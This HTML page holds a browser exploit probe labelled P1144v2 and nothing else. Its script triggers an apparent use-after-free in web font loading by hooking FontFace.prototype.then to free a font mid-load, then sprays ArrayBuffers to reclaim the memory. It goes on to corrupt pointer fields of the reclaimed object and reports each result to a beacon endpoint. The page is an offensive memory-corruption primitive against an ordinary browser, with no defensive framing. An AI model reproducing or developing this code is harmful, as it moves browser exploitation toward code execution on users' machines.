<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1144v2</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1144v2: POST-UAF METHOD CALLS ===');
log('info','Properties are cached. Methods might dereference the dangling ptr!');
B('P1144V2-START','t='+Date.now());

var r=Date.now()%100000;
var uafHit=false;
var sprayBufs=[];
var savedFF=null;

var st=document.createElement('style');
st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
document.head.appendChild(st);
var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;
savedFF=ff;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  for(var k=0;k<60;k++) sprayBufs.push(new ArrayBuffer(192));
  return undefined;
},set:function(){}});

document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  // Find reclaimed buffer
  var rIdx=-1,rv=null;
  for(var k=0;k<sprayBufs.length;k++){
    var v=new BigUint64Array(sprayBufs[k]);
    for(var q=0;q<v.length;q++){if(v[q]!==0n){rIdx=k;rv=v;break;}}
    if(rIdx>=0)break;
  }
  if(rIdx<0){log('fail','No reclaim');B('P1144V2-DONE','reclaim=false');return;}

  // Save original layout
  var orig=[];
  for(var q=0;q<rv.length;q++) orig.push(rv[q]);
  var q11=hex64(rv[11]);var q13=hex64(rv[13]);
  log('ok','Reclaimed idx='+rIdx+' q11='+q11+' q13='+q13);
  B('P1144V2-RECLAIM','idx='+rIdx+'|q11='+q11+'|q13='+q13);

  // ===== TEST 1: ff.load() with original data =====
  log('phase','--- Test 1: ff.load() ---');
  var loadResult='?';
  try{
    var p=savedFF.load();
    loadResult='promise';
    p.then(function(){
      B('P1144V2-LOAD-THEN','resolved');
      log('ok','load() promise resolved');
    },function(e){
      B('P1144V2-LOAD-CATCH','rejected:'+e);
      log('fail','load() promise rejected: '+e);
    });
  }catch(e){
    loadResult='ERR:'+e.message;
    log('fail','load() threw: '+e.message);
  }
  B('P1144V2-T1','load='+loadResult);

  // ===== TEST 2: Re-add to document.fonts =====
  log('phase','--- Test 2: re-add to fonts ---');
  var addResult='?';
  try{
    document.fonts.add(savedFF);
    addResult='OK';
    log('ok','document.fonts.add(savedFF) succeeded');
  }catch(e){
    addResult='ERR:'+e.message;
    log('fail','add() threw: '+e.message);
  }
  B('P1144V2-T2','add='+addResult);

  // ===== TEST 3: fonts.check() after re-add =====
  log('phase','--- Test 3: fonts.check ---');
  var checkResult='?';
  try{
    var c=document.fonts.check('1em y'+r);
    checkResult=''+c;
    log('ok','fonts.check = '+c);
  }catch(e){
    checkResult='ERR:'+e.message;
    log('fail','check() threw: '+e.message);
  }
  B('P1144V2-T3','check='+checkResult);

  // ===== TEST 4: Render text with the font =====
  log('phase','--- Test 4: render with font ---');
  var renderResult='?';
  try{
    var canvas=document.createElement('canvas');
    canvas.width=200;canvas.height=50;
    var ctx=canvas.getContext('2d');
    ctx.font='24px y'+r+', serif';
    ctx.fillText('ABCDEF',10,30);
    var px=ctx.getImageData(0,0,200,50).data;
    var nzPx=0;
    for(var i=0;i<px.length;i+=4){if(px[i]>0||px[i+1]>0||px[i+2]>0)nzPx++;}
    renderResult='pixels='+nzPx;
    log('ok','Rendered: '+nzPx+' non-zero pixels');
  }catch(e){
    renderResult='ERR:'+e.message;
    log('fail','render threw: '+e.message);
  }
  B('P1144V2-T4','render='+renderResult);

  // ===== TEST 5: Modify q11 (source list ptr) then trigger access =====
  log('phase','--- Test 5: corrupt q11 + re-access ---');

  // Point q11 at another spray buffer (we control its contents)
  // First, find a zero spray buffer to use as fake target
  var fakeIdx=-1;
  for(var k=0;k<sprayBufs.length;k++){
    if(k===rIdx) continue;
    var v=new BigUint64Array(sprayBufs[k]);
    if(v[0]===0n){fakeIdx=k;break;}
  }

  if(fakeIdx>=0){
    // Write refcount=1 pattern at fake target
    var fv=new BigUint64Array(sprayBufs[fakeIdx]);
    fv[0]=1n; // fake refcount

    // We don't know the address of fakeIdx's backing store...
    // But q11 originally pointed to a real CSSFontFaceSource
    // Let's corrupt q11 to point to 0 (null) and see what happens
    rv[11]=0n;
    var corruptResult='?';
    try{
      var c2=document.fonts.check('1em y'+r);
      corruptResult='check='+c2;
      log('ok','Corrupt check = '+c2);
    }catch(e){
      corruptResult='ERR:'+e.message;
      log('fail','Corrupt check threw: '+e.message);
    }
    B('P1144V2-T5A','null_q11='+corruptResult);

    // Restore q11
    rv[11]=orig[11];

    // Try setting family string ptr (q1? q2?) to null
    rv[1]=0x4141414141414141n;
    var famResult='?';
    try{
      famResult='OK:'+savedFF.family;
    }catch(e){
      famResult='ERR:'+e.message;
    }
    rv[1]=orig[1];
    B('P1144V2-T5B','q1_corrupt_family='+famResult);

    // Try corrupting q3 and reading family
    rv[3]=0x4242424242424242n;
    try{famResult='OK:'+savedFF.family;}catch(e){famResult='ERR:'+e.message;}
    rv[3]=orig[3];
    B('P1144V2-T5C','q3_corrupt_family='+famResult);

    log('ok','Corruption tests done');
  }

  // ===== TEST 6: Set family property after UAF =====
  log('phase','--- Test 6: set property ---');
  var setResult='?';
  try{
    savedFF.family='HACKED'+r;
    setResult='set:'+savedFF.family;
    log('ok','Set family = '+savedFF.family);
  }catch(e){
    setResult='ERR:'+e.message;
    log('fail','set threw: '+e.message);
  }
  B('P1144V2-T6','set_family='+setResult);

  // Check if the buffer changed after set
  var bufChanged=false;
  for(var q=0;q<rv.length;q++){
    if(rv[q]!==orig[q]){bufChanged=true;break;}
  }
  B('P1144V2-T6B','buf_changed='+bufChanged);
  if(bufChanged) log('win','!!! BUFFER CHANGED AFTER SET - ENGINE WRITES TO OUR BUFFER !!!');

  // Restore
  for(var q=0;q<orig.length;q++) rv[q]=orig[q];

  B('P1144V2-DONE','all_tests_complete');
  log('phase','=== ALL TESTS DONE ===');
},30);
</script></body></html>
